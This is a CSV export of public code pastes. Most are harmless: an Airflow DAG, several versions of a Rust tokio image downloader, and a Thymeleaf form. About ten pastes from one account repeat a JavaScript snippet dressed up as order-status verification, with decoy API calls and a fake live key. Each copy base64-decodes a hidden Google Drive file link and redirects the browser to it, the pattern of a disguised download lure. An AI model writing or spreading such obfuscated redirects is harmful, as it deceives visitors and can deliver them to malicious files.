id,title,username,language,date,content
wWNSdxw0,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 10:49:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74176/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7ZdFFM2j,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 10:33:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/59754/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cRG2icGB,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 10:18:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40664/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fzpL4XAP,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 10:02:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67784/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1uRCUM5P,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 09:47:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89734/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VKjH7ZxF,alt_churn,vishneva_olga,Python,Sunday 6th of April 2025 09:44:15 AM CDT,"# dags/alt_churn.py

from venv import create
import pendulum
from airflow import DAG
from airflow.operators.python import PythonOperator
from plugins.steps.churn import create_table, extract, transform, load
from plugins.steps.messages import send_telegram_success_message, send_telegram_failure_message

with DAG(
    dag_id='alt_churn',
    schedule='@once',
    start_date=pendulum.datetime(2023, 1, 1, tz=""UTC""),
    tags=[""ETL""],
    on_success_callback=send_telegram_success_message,
    on_failure_callback=send_telegram_failure_message
) as dag:
    
    # код даг
    create_table_step = PythonOperator(task_id='create_table', python_callable=create_table)
    extract_step = PythonOperator(task_id='extract', python_callable=extract)
    transform_step = PythonOperator(task_id='transform', python_callable=transform)
    load_step = PythonOperator(task_id='load', python_callable=load)

    create_table_step >> extract_step >> transform_step >> load_step"
01EQP0Lq,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 09:32:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67157/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FfNLfUJA,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 09:16:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13731/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jRqpkz3D,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 09:00:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91782/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ynzZBV0k,Tokio Rust Concurrency Attempt 4,MetonymyQT,Rust,Sunday 6th of April 2025 08:52:43 AM CDT,"use anyhow::{Result, anyhow};
use log::{debug, error, info};
use signal_hook::consts::{SIGINT, SIGTERM};
use signal_hook::iterator::Signals;
use std::ops::Deref;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use tokio::fs::File;
use tokio::io::AsyncWriteExt;
use tokio::sync::mpsc;
use tokio::sync::mpsc::Sender;
use tokio::sync::oneshot;
use tokio::task::{JoinError, JoinHandle};
use tokio::time::{sleep, timeout};
use tokio_util::task::TaskTracker;

fn setup_graceful_shutdown(cancelled: oneshot::Sender<bool>) -> JoinHandle<()> {
    tokio::spawn(async move {
        let signals = Signals::new([SIGINT, SIGTERM]);
        match signals {
            Ok(mut signal_info) => {
                loop {
                    if signal_info.pending().next().is_some() {
                        info!(""user request cancellation"");
                        let _ = cancelled.send(true);
                        return;
                    }
                    sleep(Duration::from_millis(250)).await;
                }
            }
            Err(error) => {
                error!(""Failed to setup signal handler: {error}"")
            }
        }
    })
}

async fn download_image(tx: Sender<Result<bytes::Bytes, anyhow::Error>>, url: &str) {
    info!(""Downloading image for {}"", url);
    let resp = reqwest::get(url).await;
    if let Ok(resp) = resp {
        let image_bytes = resp.bytes().await;
        match image_bytes {
            Ok(data) => {
                tx.send(Ok(data)).await.expect(""failed to send message"");
            }
            Err(err) => {
                let send_result = tx.send(Err(anyhow!(""failed to get image data: {}"", err)))
                    .await;

                debug!(""download image ok {:?} for url {}"", send_result, url)
            }
        }
    } else {
        let send_result = tx.send(Err(anyhow!(""failed to get response"")))
            .await;

        debug!(""download image error {:?}  for url {}"", send_result, url)
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();

    let task_timeout = Duration::from_millis(60000);

    let (tx, mut rx) = mpsc::channel(32);
    let (cancel_tx, mut cancel_rx) = oneshot::channel::<bool>();
    let tracker = TaskTracker::new();
    let signal_wait_handle = setup_graceful_shutdown(cancel_tx);

    let urls: Vec<&str> = vec![
        ""https://images.unsplash.com/photo-1739117956532-8a37c76093dd?fm=jpg"",
        ""https://images.unsplash.com/photo-1735930371721-d1243e8122ab?fm=jpg"",
        ""https://images.unsplash.com/photo-1732204662871-f853329ce638?fm=jpg"",
        ""https://images.unsplash.com/photo-1712677925320-5f93d7f853f5?fm=jpg"",
        ""https://images.unsplash.com/photo-1712677925900-12574cb3cf15?fm=jpg"",
        ""https://images.unsplash.com/photo-1710436000845-bb707af976a6?fm=jpg"",
        ""https://images.unsplash.com/photo-1700386277812-5ff74eb03650?fm=jpg"",
        ""https://images.unsplash.com/photo-1700386277415-c9c5270ee8b8?fm=jpg"",
        ""https://images.unsplash.com/photo-1691947563165-28011f40d786?fm=jpg"",
        ""https://images.unsplash.com/photo-1691782359338-97fcbcce8ce8?fm=jpg"",
    ];

    let mut handles: Vec<JoinHandle<Result<(), JoinError>>> = Vec::new();
    for url in urls {
        let tx = tx.clone();
        let handle = tracker.spawn(tokio::spawn(async move {
            let timeout_status = timeout(task_timeout, download_image(tx, url)).await;
            debug!(""timeout status = {:?} for url {}"", timeout_status, url)
        }));
        handles.push(handle);
    }

    let wait_task = tracker.spawn(tokio::spawn(async move {
        for handle in handles {
            let _ = handle.await;
        }
        drop(tx);
    }));

    let write_task = tracker.spawn(tokio::spawn(async move {
        let mut counter = 1;
        while let Some(message) = rx.recv().await {
            if let Ok(image_bytes) = message {
                let result = timeout(
                    task_timeout,
                    tokio::spawn(async move {
                        let file = File::create(format!(""{}.jpg"", counter)).await;
                        if let Ok(mut file) = file {
                            let _ = file.write_all(&image_bytes).await;
                            info!(""Wrote image {}"", counter);
                        } else {
                            error!(""Failed to write image {}"", counter)
                        }
                    }),
                )
                .await;

                debug!(""write task timeout result {:?}"", task_timeout);
                counter += 1;
            }
        }
    }));

    tracker.close();
    tokio::select! {
        _ = cancel_rx => {
            info!(""computation cancelled"");
            wait_task.abort();
            write_task.abort();
        }
        _ = tracker.wait() => {
            info!(""operation completed"");
        }
    }
    signal_wait_handle.abort();

    Ok(())
}
"
1bkiTbRA,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 08:45:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38512/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WcDtsDxK,Tokio Rust Concurrency Attempt 3,MetonymyQT,Rust,Sunday 6th of April 2025 08:39:45 AM CDT,"use anyhow::{Result, anyhow};
use log::{debug, error, info};
use signal_hook::consts::{SIGINT, SIGTERM};
use signal_hook::iterator::Signals;
use std::ops::Deref;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use tokio::fs::File;
use tokio::io::AsyncWriteExt;
use tokio::sync::mpsc;
use tokio::sync::mpsc::Sender;
use tokio::sync::oneshot;
use tokio::task::JoinHandle;
use tokio::time::{sleep, timeout};

fn setup_graceful_shutdown(cancelled: oneshot::Sender<bool>) -> JoinHandle<()> {
    tokio::spawn(async move {
        let signals = Signals::new([SIGINT, SIGTERM]);
        match signals {
            Ok(mut signal_info) => {
                loop {
                    if signal_info.pending().next().is_some() {
                        info!(""user request cancellation"");
                        let _ = cancelled.send(true);
                        return;
                    }
                    sleep(Duration::from_millis(250)).await;
                }
            }
            Err(error) => {
                error!(""Failed to setup signal handler: {error}"")
            }
        }
    })
}

async fn download_image(tx: Sender<Result<bytes::Bytes, anyhow::Error>>, url: &str) {
    info!(""Downloading image for {}"", url);
    let resp = reqwest::get(url).await;
    if let Ok(resp) = resp {
        let image_bytes = resp.bytes().await;
        match image_bytes {
            Ok(data) => {
                tx.send(Ok(data)).await.expect(""failed to send message"");
            }
            Err(err) => {
                let send_result = tx.send(Err(anyhow!(""failed to get image data: {}"", err)))
                    .await;

                debug!(""download image ok {:?} for url {}"", send_result, url)
            }
        }
    } else {
        let send_result = tx.send(Err(anyhow!(""failed to get response"")))
            .await;

        debug!(""download image error {:?}  for url {}"", send_result, url)
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();

    let task_timeout = Duration::from_millis(60000);

    let (tx, mut rx) = mpsc::channel(32);
    let (cancel_tx, mut cancel_rx) = oneshot::channel::<bool>();
    let (done_tx, mut done_rx) = oneshot::channel::<bool>();
    let signal_wait_handle = setup_graceful_shutdown(cancel_tx);

    let urls: Vec<&str> = vec![
        ""https://images.unsplash.com/photo-1739117956532-8a37c76093dd?fm=jpg"",
        ""https://images.unsplash.com/photo-1735930371721-d1243e8122ab?fm=jpg"",
        ""https://images.unsplash.com/photo-1732204662871-f853329ce638?fm=jpg"",
        ""https://images.unsplash.com/photo-1712677925320-5f93d7f853f5?fm=jpg"",
        ""https://images.unsplash.com/photo-1712677925900-12574cb3cf15?fm=jpg"",
        ""https://images.unsplash.com/photo-1710436000845-bb707af976a6?fm=jpg"",
        ""https://images.unsplash.com/photo-1700386277812-5ff74eb03650?fm=jpg"",
        ""https://images.unsplash.com/photo-1700386277415-c9c5270ee8b8?fm=jpg"",
        ""https://images.unsplash.com/photo-1691947563165-28011f40d786?fm=jpg"",
        ""https://images.unsplash.com/photo-1691782359338-97fcbcce8ce8?fm=jpg"",
    ];

    let mut handles: Vec<JoinHandle<()>> = Vec::new();
    for url in urls {
        let tx = tx.clone();
        let handle = tokio::spawn(async move {
            let timeout_status = timeout(task_timeout, download_image(tx, url)).await;
            debug!(""timeout status = {:?} for url {}"", timeout_status, url)
        });
        handles.push(handle);
    }

    let wait_task = tokio::spawn(async move {
        for handle in handles {
            let _ = handle.await;
        }
        drop(tx);
    });

    let write_task = tokio::spawn(async move {
        let mut counter = 1;
        while let Some(message) = rx.recv().await {
            if let Ok(image_bytes) = message {
                let result = timeout(
                    task_timeout,
                    tokio::spawn(async move {
                        let file = File::create(format!(""{}.jpg"", counter)).await;
                        if let Ok(mut file) = file {
                            let _ = file.write_all(&image_bytes).await;
                            info!(""Wrote image {}"", counter);
                        } else {
                            error!(""Failed to write image {}"", counter)
                        }
                    }),
                )
                .await;

                debug!(""write task timeout result {:?}"", task_timeout);
                counter += 1;
            }
        }
        let _ = done_tx.send(true);
    });

    tokio::select! {
        _ = cancel_rx => {
            info!(""computation cancelled"");
            wait_task.abort();
            write_task.abort();
        }
        _ = done_rx => {
            info!(""operation completed"");
        }
    }
    signal_wait_handle.abort();

    Ok(())
}
"
b8NYmGZA,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 08:30:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76227/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JLph5FVv,Tokio Rust Concurrency Attempt 2,MetonymyQT,Rust,Sunday 6th of April 2025 08:22:40 AM CDT,"use anyhow::{Result, anyhow};
use log::{debug, error, info};
use signal_hook::consts::{SIGINT, SIGTERM};
use signal_hook::iterator::Signals;
use std::ops::Deref;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use tokio::fs::File;
use tokio::io::AsyncWriteExt;
use tokio::sync::mpsc;
use tokio::sync::mpsc::Sender;
use tokio::sync::oneshot;
use tokio::task::JoinHandle;
use tokio::time::{sleep, timeout};

fn setup_graceful_shutdown(cancelled: oneshot::Sender<bool>)  {
    thread::spawn(move || {
        let signals = Signals::new([SIGINT, SIGTERM]);
        match signals {
            Ok(mut signal_info) => {
                if signal_info.forever().next().is_some() {
                    info!(""user request cancellation"");
                    let _ = cancelled.send(true);
                    return;
                }
            }
            Err(error) => {
                error!(""Failed to setup signal handler: {error}"")
            }
        }
    });
}

async fn download_image(tx: Sender<Result<bytes::Bytes, anyhow::Error>>, url: &str) {
    info!(""Downloading image for {}"", url);
    let resp = reqwest::get(url).await;
    if let Ok(resp) = resp {
        let image_bytes = resp.bytes().await;
        match image_bytes {
            Ok(data) => {
                tx.send(Ok(data)).await.expect(""failed to send message"");
            }
            Err(err) => {
                let send_result = tx.send(Err(anyhow!(""failed to get image data: {}"", err)))
                    .await;

                debug!(""download image ok {:?} for url {}"", send_result, url)
            }
        }
    } else {
        let send_result = tx.send(Err(anyhow!(""failed to get response"")))
            .await;

        debug!(""download image error {:?}  for url {}"", send_result, url)
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();

    let task_timeout = Duration::from_millis(500);

    let (tx, mut rx) = mpsc::channel(32);
    let (cancel_tx, mut cancel_rx) = oneshot::channel::<bool>();
    let (done_tx, mut done_rx) = oneshot::channel::<bool>();
    setup_graceful_shutdown(cancel_tx);

    let urls: Vec<&str> = vec![
        ""https://images.unsplash.com/photo-1739117956532-8a37c76093dd?fm=jpg"",
        ""https://images.unsplash.com/photo-1735930371721-d1243e8122ab?fm=jpg"",
        ""https://images.unsplash.com/photo-1732204662871-f853329ce638?fm=jpg"",
        ""https://images.unsplash.com/photo-1712677925320-5f93d7f853f5?fm=jpg"",
        ""https://images.unsplash.com/photo-1712677925900-12574cb3cf15?fm=jpg"",
        ""https://images.unsplash.com/photo-1710436000845-bb707af976a6?fm=jpg"",
        ""https://images.unsplash.com/photo-1700386277812-5ff74eb03650?fm=jpg"",
        ""https://images.unsplash.com/photo-1700386277415-c9c5270ee8b8?fm=jpg"",
        ""https://images.unsplash.com/photo-1691947563165-28011f40d786?fm=jpg"",
        ""https://images.unsplash.com/photo-1691782359338-97fcbcce8ce8?fm=jpg"",
    ];

    let mut handles: Vec<JoinHandle<()>> = Vec::new();
    for url in urls {
        let tx = tx.clone();
        let handle = tokio::spawn(async move {
            let timeout_status = timeout(task_timeout, download_image(tx, url)).await;
            debug!(""timeout status = {:?} for url {}"", timeout_status, url)
        });
        handles.push(handle);
    }

    let wait_task = tokio::spawn(async move {
        for handle in handles {
            let _ = handle.await;
        }
        drop(tx);
        let _ = done_tx.send(true);
    });

    let write_task = tokio::spawn(async move {
        let mut counter = 1;
        while let Some(message) = rx.recv().await {
            if let Ok(image_bytes) = message {

                let result = timeout(
                    task_timeout,
                    tokio::spawn(async move {
                        let file = File::create(format!(""{}.jpg"", counter)).await;
                        if let Ok(mut file) = file {
                            let _ = file.write_all(&image_bytes).await;
                            info!(""Wrote image {}"", counter);
                        } else {
                            error!(""Failed to write image {}"", counter)
                        }
                    }),
                )
                .await;

                debug!(""write task timeout result {:?}"", task_timeout);

                counter += 1;
            }
        }
    });

    tokio::select! {
        _ = cancel_rx => {
            info!(""computation cancelled"");
            wait_task.abort();
            write_task.abort();
        }
        _ = done_rx => {
            info!(""operation completed"");
        }
    }

    Ok(())
}
"
3eyBvn0h,form-subject,Namaru,HTML 5,Sunday 6th of April 2025 08:21:02 AM CDT,"<!DOCTYPE html>
<html xmlns:th=""http://www.thymeleaf.org"">
<head>
    <meta charset=""UTF-8"">
    <title>Formulario de Materia</title>
    <link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"">
</head>
<body class=""container mt-5"">
    <h2 th:text=""${materia.id != null} ? 'Editar Materia' : 'Nueva Materia'""></h2>
    
    <form th:action=""@{/subjectNew}"" th:object=""${materia}"" method=""post"">
        <input type=""hidden"" th:field=""*{id}"" />
        
        <div class=""mb-3"">
            <label for=""materia"" class=""form-label"">Nombre</label>
            <input type=""text"" th:field=""*{materia}"" class=""form-control"" required>
        </div>
        
        <div class=""mb-3"">
            <label for=""descripcion"" class=""form-label"">Código</label>
            <input type=""text"" th:field=""*{descripcion}"" class=""form-control"" required>
        </div>
        
        <button type=""submit"" class=""btn btn-primary"">Guardar</button>
        <a href=""/subject"" class=""btn btn-secondary"">Cancelar</a>
    </form>
</body>
</html>"
